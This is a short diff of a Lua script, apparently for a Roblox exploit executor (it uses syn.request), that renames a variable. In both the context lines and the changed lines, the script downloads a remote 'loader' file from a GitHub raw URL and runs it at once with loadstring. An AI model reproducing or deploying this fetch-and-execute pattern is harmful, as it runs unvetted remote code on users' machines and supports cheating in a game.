@@ -7,7 +7,7 @@ loadstring(req.Body)()
 wait(.5)
 
 if syn then request = syn.request end
-local req = request({
+local req2 = request({
     Url = 'https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/loader'
 })
-loadstring(req.Body)()
+loadstring(req2.Body)()
